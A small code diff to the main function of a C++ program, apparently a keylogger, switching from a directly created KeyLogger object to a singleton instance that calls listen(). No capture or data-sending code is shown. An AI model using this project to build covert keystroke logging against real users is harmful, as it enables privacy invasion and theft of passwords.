@@ -2,8 +2,8 @@
 
 int main(int argc, char *argv[]) {
 
-    KeyLogger kl;
-    kl.log();
+    KeyLogger* kl = KeyLogger::getInstance();
+    kl->listen();
 
     return 0;
 }
